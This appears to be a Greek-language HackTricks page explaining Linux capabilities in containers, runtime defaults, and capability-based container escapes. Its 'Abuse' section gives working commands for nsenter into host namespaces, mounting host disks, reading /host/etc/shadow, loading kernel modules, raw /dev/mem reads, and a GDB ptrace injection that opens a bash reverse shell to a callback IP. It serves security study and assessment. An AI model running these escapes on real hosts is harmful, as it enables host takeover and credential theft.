# Linux Capabilities Σε Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Linux capabilities είναι ένα από τα σημαντικότερα στοιχεία του container security, επειδή απαντούν σε ένα λεπτό αλλά θεμελιώδες ερώτημα: **τι σημαίνει πραγματικά το "root" μέσα σε ένα container;** Σε ένα κανονικό Linux system, το UID 0 ιστορικά συνεπαγόταν ένα πολύ ευρύ σύνολο προνομίων. Στους σύγχρονους kernels, αυτό το προνόμιο αποσυντίθεται σε μικρότερες μονάδες που ονομάζονται capabilities. Μια διεργασία μπορεί να εκτελείται ως root και παρ' όλα αυτά να στερείται πολλές ισχυρές λειτουργίες, αν έχουν αφαιρεθεί τα σχετικά capabilities. <sup>[[1]](#references)</sup>

Τα Containers βασίζονται σε μεγάλο βαθμό σε αυτή τη διάκριση. Πολλά workloads εξακολουθούν να εκκινούν ως UID 0 μέσα στο container για λόγους συμβατότητας ή απλότητας. Χωρίς την αφαίρεση capabilities, αυτό θα ήταν υπερβολικά επικίνδυνο. Με την αφαίρεση capabilities, μια διεργασία root μέσα σε container μπορεί να εκτελεί πολλές συνηθισμένες εργασίες στο container, ενώ της απαγορεύεται η εκτέλεση πιο ευαίσθητων λειτουργιών του kernel. Γι' αυτό ένα shell σε container που εμφανίζει `uid=0(root)` δεν σημαίνει αυτόματα "host root" ή ακόμη και "ευρύ kernel privilege". Τα capability sets καθορίζουν πόση αξία έχει στην πράξη αυτή η ταυτότητα root.

Για την πλήρη αναφορά των Linux capabilities και πολλά παραδείγματα abuse, δείτε:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Λειτουργία

Τα capabilities παρακολουθούνται σε πολλά sets, όπως τα permitted, effective, inheritable, ambient και bounding sets. Για πολλές αξιολογήσεις container, τα ακριβή semantics του kernel για κάθε set είναι λιγότερο σημαντικά άμεσα από το πρακτικό ερώτημα: **ποιες privileged λειτουργίες μπορεί να εκτελέσει με επιτυχία αυτή η διεργασία τώρα και ποια μελλοντικά privilege gains είναι ακόμη δυνατά;** <sup>[[1]](#references)</sup>

Ο λόγος που αυτό έχει σημασία είναι ότι πολλές breakout techniques είναι στην πραγματικότητα προβλήματα capabilities που εμφανίζονται ως προβλήματα containers. Ένα workload με `CAP_SYS_ADMIN` μπορεί να αποκτήσει πρόσβαση σε τεράστιο μέρος της λειτουργικότητας του kernel που μια κανονική root διεργασία σε container δεν θα έπρεπε να αγγίζει. Ένα workload με `CAP_NET_ADMIN` γίνεται πολύ πιο επικίνδυνο αν μοιράζεται επίσης το host network namespace. Ένα workload με `CAP_SYS_PTRACE` γίνεται πολύ πιο ενδιαφέρον αν μπορεί να δει host processes μέσω host PID sharing. Στο Docker ή το Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`, ενώ στο Kubernetes συνήθως εμφανίζεται ως `hostPID: true`.

Με άλλα λόγια, το capability set δεν μπορεί να αξιολογηθεί μεμονωμένα. Πρέπει να εξετάζεται μαζί με τα namespaces, το seccomp και την MAC policy.

## Lab

Ένας πολύ άμεσος τρόπος για να ελέγξετε τα capabilities μέσα σε ένα container είναι:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Μπορείτε επίσης να συγκρίνετε ένα πιο περιορισμένο container με ένα στο οποίο έχουν προστεθεί όλες οι capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Για να δείτε την επίδραση μιας στοχευμένης προσθήκης, δοκιμάστε να αφαιρέσετε τα πάντα και να προσθέσετε ξανά μόνο ένα capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Αυτά τα μικρά πειράματα βοηθούν να φανεί ότι ένα runtime δεν ενεργοποιεί απλώς ένα boolean που ονομάζεται "privileged". Διαμορφώνει την πραγματική επιφάνεια προνομίων που είναι διαθέσιμη στη διεργασία.

## Capabilities υψηλού κινδύνου

Οι capabilities γίνονται primitives για escape μόνο όταν η λειτουργία τους φτάνει σε έναν **host-governed resource**. Οι επαναλαμβανόμενοι συνδυασμοί υψηλού κινδύνου είναι:

- **`CAP_SYS_ADMIN`** σε συνδυασμό με host PID, block device ή writable kernel-control path. Η είσοδος σε ένα target mount namespace απαιτεί επιπλέον `CAP_SYS_CHROOT`, ενώ το mounting ενός block-based filesystem απαιτεί `CAP_SYS_ADMIN` στο initial user namespace.
- **`CAP_SYS_PTRACE`** σε συνδυασμό με ορατότητα host PID και μια attachable host process. Το `CAP_SYS_ADMIN` δεν απαιτείται για ptrace injection.
- **`CAP_DAC_OVERRIDE` ή `CAP_DAC_READ_SEARCH`** σε συνδυασμό με προσβάσιμο host filesystem. Αυτές οι capabilities παρακάμπτουν διαφορετικούς DAC ελέγχους, αλλά δεν δημιουργούν host filesystem view.
- **`CAP_SYS_MODULE`** στο initial user namespace σε συνδυασμό με ένα αποδεκτό, kernel-compatible module. Τα συνηθισμένα Linux containers μοιράζονται τον node kernel· τα VM ή userspace-kernel runtimes αλλάζουν αυτό το boundary.
- **`CAP_MKNOD`** στο initial user namespace σε συνδυασμό με ένα πραγματικό host device που επιτρέπεται ήδη από το device cgroup. Η δημιουργία ενός node δεν παρακάμπτει το device cgroup.
- **`CAP_SYS_RAWIO`** σε συνδυασμό με exposed και usable memory, I/O-port, PCI ή device-control interface.
- **`CAP_SYS_BOOT`** σε συνδυασμό με το initial PID namespace για host reboot ή με ένα usable και permitted kexec path για kernel replacement.
- **`CAP_NET_ADMIN`** στο host network namespace για άμεσο έλεγχο του network state του node. Το **`CAP_NET_RAW`** μπορεί να συμμετέχει σε protocol-specific escape, αλλά τα raw sockets από μόνα τους δεν αποτελούν node shell.

Το `CAP_SYS_CHROOT` δεν περιλαμβάνεται σκόπιμα ως standalone escape capability. Μπορεί να απαιτείται από το `setns()` σε mount namespace και να κάνει ευκολότερη τη χρήση ενός ήδη προσβάσιμου host tree, αλλά το `chroot()` από μόνο του ούτε εκθέτει αυτό το tree ούτε παρέχει νέα filesystem permissions. Παρομοίως, τα `CAP_BPF` και `CAP_PERFMON` εκθέτουν ισχυρό telemetry και kernel attack surface, αλλά χωρίς ξεχωριστό kernel flaw οι συνηθισμένες λειτουργίες τους δεν αποτελούν generic container escapes.

## Χρήση από Runtime

Τα Docker, Podman, stacks που βασίζονται στο containerd και το CRI-O χρησιμοποιούν όλα capability controls, αλλά τα defaults και τα management interfaces διαφέρουν. Το Docker τα εκθέτει απευθείας μέσω flags όπως `--cap-drop` και `--cap-add`. Το Podman εκθέτει παρόμοια controls και συνήθως τα συνδυάζει με rootless execution ως επιπλέον safety layer. Το Kubernetes εμφανίζει capability additions και drops μέσω του `securityContext` του Pod ή του container· τα lower-level runtimes εκφράζουν τα resulting sets στο OCI runtime configuration. Τα system-container environments όπως τα LXC και Incus βασίζονται επίσης σε capability control, αλλά η ευρύτερη host integration τους μπορεί να ωθήσει τους operators να χαλαρώσουν τα defaults πιο επιθετικά απ’ ό,τι θα έκαναν για ένα application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Η ίδια αρχή ισχύει για όλα: μια capability που είναι τεχνικά δυνατό να δοθεί δεν είναι απαραίτητα capability που πρέπει να δοθεί. Πολλά πραγματικά incidents ξεκινούν όταν ένας operator προσθέτει μια capability απλώς επειδή ένα workload απέτυχε υπό αυστηρότερο configuration και η ομάδα χρειαζόταν μια γρήγορη λύση.

## Λανθασμένες ρυθμίσεις

Το πιο προφανές λάθος είναι το **`--cap-add=ALL`** σε CLIs τύπου Docker/Podman, αλλά δεν είναι το μόνο. Στην πράξη, πιο συνηθισμένο πρόβλημα είναι η παραχώρηση μίας ή δύο εξαιρετικά ισχυρών capabilities, ιδιαίτερα του `CAP_SYS_ADMIN`, για να "λειτουργήσει η εφαρμογή", χωρίς παράλληλη κατανόηση των επιπτώσεων σε namespaces, seccomp και mounts. Ένα ακόμη συνηθισμένο failure mode είναι ο συνδυασμός extra capabilities με host namespace sharing. Στο Docker ή το Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`, `--network=host` ή `--userns=host`· στο Kubernetes η αντίστοιχη έκθεση εμφανίζεται συνήθως μέσω workload settings όπως `hostPID: true` ή `hostNetwork: true`. Κάθε ένας από αυτούς τους συνδυασμούς αλλάζει το τι μπορεί πραγματικά να επηρεάσει η capability.

Είναι επίσης συνηθισμένο οι administrators να πιστεύουν ότι, επειδή ένα workload δεν είναι πλήρως `--privileged`, εξακολουθεί να είναι ουσιαστικά περιορισμένο. Μερικές φορές αυτό ισχύει, αλλά μερικές φορές το effective posture βρίσκεται ήδη αρκετά κοντά στο privileged, ώστε η διάκριση να παύει να έχει operational σημασία.

## Abuse

Ξεκινήστε καταγράφοντας τα effective sets, το user-namespace mapping, την κατάσταση του seccomp, τα namespaces, τα mounts και τα devices. Ένα όνομα capability χωρίς αυτό το context δεν αποδεικνύει escape:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespaces και block devices

Με ορατότητα των PID του host, το `CAP_SYS_ADMIN` μπορεί να εισέλθει στα namespaces του host. Η λειτουργία mount-namespace απαιτεί επίσης `CAP_SYS_CHROOT` στο user namespace του caller.

**Ελέγξτε το capability και το confinement:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Καταγράψτε το target:** επιβεβαιώστε το host PID sharing από τη διαμόρφωση του container/Pod ή από μια unmistakable λίστα διεργασιών του host και, στη συνέχεια, ελέγξτε τα namespaces του target. Ένα τοπικό PID 1 υπάρχει και στα private PID namespaces, επομένως η παρουσία του από μόνη της δεν αποδεικνύει το host PID sharing.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Εκμεταλλευτείτε τη διαδρομή του namespace:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Οι έλεγχοι των capabilities πρέπει να είναι επιτυχείς στα user namespaces που είναι κάτοχοι των targets. Το `--pid=host` ή το Kubernetes `hostPID: true` παρέχει visibility· δεν παρέχει τα capabilities.

Για το alternative block-device path, **enumerate** τους candidates και, στη συνέχεια, **exploit** το προσβάσιμο filesystem κάνοντας πρώτα mount τον validated candidate ως read-only:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
Ο κόμβος συσκευής πρέπει να υπάρχει, το device cgroup πρέπει να το επιτρέπει και τα block-filesystem mounts απαιτούν `CAP_SYS_ADMIN` στο αρχικό user namespace. Ένα host root που έχει ήδη γίνει bind-mounted στο `/host` παρέχει πρόσβαση στο host **χωρίς** `CAP_SYS_ADMIN`· το `chroot /host` είναι απλώς μια διευκόλυνση και απαιτεί ξεχωριστά `CAP_SYS_CHROOT`.

### Προσβάσιμο host root: άμεση εκτέλεση filesystem

Αν το host root έχει ήδη γίνει mount στο `/host`, επιβεβαιώστε πρώτα το mount και στη συνέχεια χρησιμοποιήστε απευθείας την υπάρχουσα πρόσβαση. Αυτή η διαδρομή δεν εξαρτάται από το `CAP_SYS_ADMIN`:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
Εάν το `chroot()` δεν είναι διαθέσιμο, αλλά το δυαδικό αρχείο του host είναι συμβατό με την αρχιτεκτονική και τον loader του container, συχνά μπορεί να κληθεί μέσω του προσαρτημένου δέντρου:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Οι άμεσες αναγνώσεις και εγγραφές κάτω από το `/host` αποτελούν ήδη παραβίαση του filesystem του host. Το `chroot()` ή η εκτέλεση ενός binary του host απλώς κάνουν αυτή την πρόσβαση πιο εύκολη· καμία από τις δύο λειτουργίες δεν δημιουργεί το mount του host ούτε παρακάμπτει ένα read-only mount ή μια πολιτική MAC.

### `CAP_SYS_PTRACE`: injection σε διεργασία του host

Με ορατότητα PID του host και `CAP_SYS_PTRACE` στο user namespace του target, το GDB μπορεί να κάνει μια εγκεκριμένη διεργασία του host να καλέσει τη `system()`. Το `CAP_SYS_ADMIN` δεν απαιτείται.

**Έλεγχος του capability και των στοιχείων ελέγχου attachment:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Απαριθμήστε και επιλέξτε έναν disposable στόχο:** επιβεβαιώστε την κοινή χρήση των host PID από τη διαμόρφωση ή από μια unmistakable λίστα διεργασιών του node· μην επιλέξετε ποτέ το PID 1 ή έναν critical daemon.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Εκμεταλλευτείτε την επιλεγμένη διεργασία:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
Ο στόχος πρέπει να επιτρέπει τη σύνδεση και να διαθέτει χρησιμοποιήσιμο σύμβολο `system()` και διαδρομή Bash payload. Τα Yama, non-dumpable state, seccomp, τα user namespaces και η MAC policy μπορούν να μπλοκάρουν την αλυσίδα. Το GDB σταματά τον στόχο όσο είναι συνδεδεμένο, επομένως χρησιμοποιήστε μόνο μια disposable διεργασία σε lab.

### `CAP_DAC_OVERRIDE` και `CAP_DAC_READ_SEARCH`: προστατευμένα αρχεία host

Αυτές οι capabilities δεν εκθέτουν το filesystem του host. Αν το `/host` είναι ήδη mount του host, το `CAP_DAC_READ_SEARCH` μπορεί να παρακάμψει τους ελέγχους DAC για ανάγνωση/αναζήτηση και το `CAP_DAC_OVERRIDE` μπορεί επιπλέον να παρακάμψει τους συνήθεις ελέγχους εγγραφής:

**Έλεγχος των capabilities:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Απαριθμήστε το εκτεθειμένο filesystem του host και τα permissions του στόχου:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Δοκιμάστε τις παρακάμψεις ανάγνωσης και εγγραφής** σε ένα disposable lab:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Μια mount μόνο για ανάγνωση και οι κανόνες LSM εξακολουθούν να ισχύουν. Το `CAP_DAC_READ_SEARCH` εξουσιοδοτεί επίσης το `open_by_handle_at()`, αλλά ένα breakout όπως το Shocker χρειάζεται επιπλέον ένα file descriptor mount για το ίδιο υποκείμενο filesystem, έγκυρα ή discoverable handles, συμβατή διάταξη filesystem/storage και απουσία αποκλεισμού από το runtime ή το LSM. Δεν παρέχει αυθαίρετη πρόσβαση σε κάθε filesystem εκτός του mount namespace.

### `CAP_SYS_MODULE`: εκτέλεση στον shared kernel

Σε ένα συνηθισμένο Linux container, ένα αποδεκτό module εκτελείται στον shared host kernel.

**Έλεγξε το capability και το scope του user namespace:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Απαριθμήστε τα προαπαιτούμενα για τη φόρτωση module:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Εκμετάλλευση μόνο με συμβατό, εκ των προτέρων ελεγμένο proof module σε disposable node:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Η capability πρέπει να είναι effective στο αρχικό user namespace. Η έκδοση και η διαμόρφωση του kernel, οι υπογραφές των modules, το lockdown, το seccomp και η πολιτική LSM πρέπει να επιτρέπουν το load. Τα Kata, gVisor, Hyper-V isolation και παρόμοια runtimes αλλάζουν το όριο του kernel στο οποίο φτάνει το workload.

### `CAP_MKNOD`: δημιουργία επιτρεπόμενου device handle

Η `CAP_MKNOD` δημιουργεί ένα device node, αλλά δεν παρακάμπτει το device cgroup. Η δημιουργία device δεν είναι namespaced, επομένως η capability πρέπει να είναι effective στο αρχικό user namespace.

**Έλεγχος της capability και του scope του user namespace:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Κατάγραψε τις πραγματικές συσκευές, τους major/minor αριθμούς τους και οποιαδήποτε ορατή cgroup-v1 allowlist:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Exploit ενός επικυρωμένου υποψηφίου ext-family μόνο για ανάγνωση:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Άλλα filesystems χρειάζονται ένα αντίστοιχο εργαλείο μόνο για ανάγνωση· η προσάρτηση της συσκευής απαιτεί επιπλέον `CAP_SYS_ADMIN`. Το `Operation not permitted` κατά το άνοιγμα του δημιουργημένου node συνήθως υποδεικνύει ότι το device cgroup εξακολουθεί να το αποκλείει. Υπό το cgroup v2, η πρόσβαση σε συσκευές επιβάλλεται συνήθως με BPF και δεν υπάρχει αρχείο `devices.list`, επομένως ένα επιτυχές open είναι η καθοριστική δοκιμή.

### `CAP_SYS_RAWIO`: εκτεθειμένο raw-I/O interface

Δεν υπάρχει portable generic payload: οι έγκυρες διευθύνσεις και τα effects εξαρτώνται από το hardware και τη ρύθμιση του kernel.

**Έλεγχος του capability και του scope του user namespace:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Απαριθμήστε τις εκτεθειμένες raw διεπαφές, το hardware και τα drivers:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Exploit μόνο με εγκεκριμένο proof για την αναγνωρισμένη συσκευή και το εύρος διευθύνσεων.** Αν το `/dev/mem` είναι η εγκεκριμένη από το εργαστήριο διεπαφή, αυτό το template αποδεικνύει την αποκάλυψη μνήμης node χωρίς να εκτυπώνει τα περιεχόμενά της:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Η διεύθυνση πρέπει να προέρχεται από το hardware map του lab, επειδή η ανάγνωση ορισμένων περιοχών MMIO μπορεί να έχει side effects. Μια generic εντολή memory-write θα ήταν παραπλανητική και μη ασφαλής: η ίδια διεύθυνση μπορεί να είναι ακίνδυνη σε ένα μηχάνημα και να ελέγχει hardware ή kernel memory σε ένα άλλο. Τα device cgroups, τα filesystem permissions, το αυστηρό `/dev/mem`, το kernel lockdown, το virtualization και η πολιτική LSM συνήθως εμποδίζουν την πρόσβαση που θα ήταν χρήσιμη.

### `CAP_SYS_BOOT`: reboot του namespace ή αντικατάσταση του kernel

Σε ένα private PID namespace, το `reboot()` τερματίζει τη διεργασία init αυτού του namespace αντί να κάνει reboot στον host. Επομένως, για να επηρεαστεί το reboot του host απαιτείται το αρχικό PID namespace, συνήθως μέσω host PID sharing. Μια διαδρομή kexec απαιτεί επίσης ένα συμβατό kernel image και permissive πολιτική lockdown/signature:

**Έλεγχος του capability:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Καταγράψτε τις προϋποθέσεις του PID namespace και του kexec:** επιβεβαιώστε την κοινή χρήση των PID του host από τη ρύθμιση του workload, επειδή ένας σύνδεσμος προς ένα PID namespace από μόνος του δεν αποκαλύπτει αν πρόκειται για το αρχικό namespace του node.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Εκτελέστε exploit μόνο όταν η επανεκκίνηση ενός αναλώσιμου lab node αποτελεί ρητή άσκηση:**
```bash
sync
reboot -f
```
Μην εκτελέσετε αυτή την εντολή και μην φορτώσετε kernel σε shared node απλώς για να αποδείξετε την capability. Σε ένα private PID namespace τερματίζει μόνο το init process του συγκεκριμένου namespace και δεν αποδεικνύει επίδραση στο host.

### `CAP_NET_ADMIN` και `CAP_NET_RAW`: διαδρομές δικτύου του host

Η `CAP_NET_ADMIN` επηρεάζει μόνο το τρέχον network namespace.

**Ελέγξτε τις capabilities και τον περιορισμό:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Απαριθμήστε το τρέχον δίκτυο και επιβεβαιώστε τη δικτύωση host από τη διαμόρφωση του workload:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Άσκηση `CAP_NET_ADMIN` με αναστρέψιμο τρόπο:** με host networking, το προσωρινό interface είναι interface του node.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` επιτρέπει RAW και PACKET sockets, αλλά δεν παρέχει ένα γενικό host shell. Για να **καταγράψετε** την τεκμηριωμένη αλυσίδα GCE, ελέγξτε τη διαδρομή metadata και καταγράψτε αν είναι παρατηρήσιμη η plaintext κίνηση του guest-agent:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Αν υπάρχουν οι αντίστοιχες προϋποθέσεις, **exploit** το environment-specific chain όπως τεκμηριώνεται στο [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): κάνε capture το request και το sequence state, κάνε inject το forged metadata response που περιέχει ένα SSH key και, στη συνέχεια, κάνε validate την πρόσβαση στο host. Το chain απαιτούσε root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE metadata traffic και ένα raceable guest-agent request· η σύγχρονη συμπεριφορά του transport ή του agent μπορεί να το διακόψει.

## Έλεγχοι

Ο στόχος των capability checks δεν είναι μόνο η εξαγωγή raw τιμών, αλλά η κατανόηση του αν το process έχει αρκετά privileges ώστε να καταστήσει επικίνδυνη την τρέχουσα namespace και mount κατάστασή του.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Τι είναι ενδιαφέρον εδώ:

- Το `capsh --print` είναι ο ευκολότερος τρόπος για να εντοπίσετε capabilities υψηλού κινδύνου, όπως `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ή `cap_sys_module`.
- Η γραμμή `CapEff` στο `/proc/self/status` σας δείχνει τι είναι πραγματικά effective τώρα, όχι απλώς τι μπορεί να είναι διαθέσιμο σε άλλα sets.
- Ένα capability dump γίνεται πολύ πιο σημαντικό αν το container μοιράζεται επίσης τα host PID, network ή user namespaces ή διαθέτει writable host mounts.

Μετά τη συλλογή των raw capability πληροφοριών, το επόμενο βήμα είναι η ερμηνεία τους. Εξετάστε αν η διεργασία είναι root, αν είναι ενεργά τα user namespaces, αν μοιράζονται host namespaces, αν το seccomp εφαρμόζεται και αν το AppArmor ή το SELinux εξακολουθεί να περιορίζει τη διεργασία. Ένα capability set από μόνο του αποτελεί μόνο μέρος της εικόνας, αλλά συχνά είναι το μέρος που εξηγεί γιατί ένα container breakout λειτουργεί, ενώ ένα άλλο αποτυγχάνει με το ίδιο φαινομενικό σημείο εκκίνησης.

## Προεπιλογές Runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Μειωμένο capability set από προεπιλογή | Το Docker διατηρεί μια προεπιλεγμένη allowlist capabilities και αφαιρεί τις υπόλοιπες | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Μειωμένο capability set από προεπιλογή | Τα Podman containers είναι unprivileged από προεπιλογή και χρησιμοποιούν ένα μειωμένο capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Κληρονομεί τις προεπιλογές του runtime, εκτός αν αλλάξουν | Αν δεν καθοριστούν `securityContext.capabilities`, το container λαμβάνει το προεπιλεγμένο capability set του runtime | `securityContext.capabilities.add`, αποτυχία χρήσης του `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Συνήθως η προεπιλογή του runtime | Το effective set εξαρτάται από το runtime και το Pod spec | ίδιο με τη γραμμή του Kubernetes· η άμεση OCI/CRI configuration μπορεί επίσης να προσθέσει capabilities ρητά |

Για το Kubernetes, το σημαντικό σημείο είναι ότι το API δεν ορίζει ένα ενιαίο καθολικό προεπιλεγμένο capability set. Αν το Pod δεν προσθέτει ή αφαιρεί capabilities, το workload κληρονομεί την προεπιλογή του runtime για το συγκεκριμένο node.

## References

- [1] [capabilities(7) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Διαμόρφωση Linux container](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege και Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Ορισμός capabilities για ένα container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` και `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Ασφάλεια](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
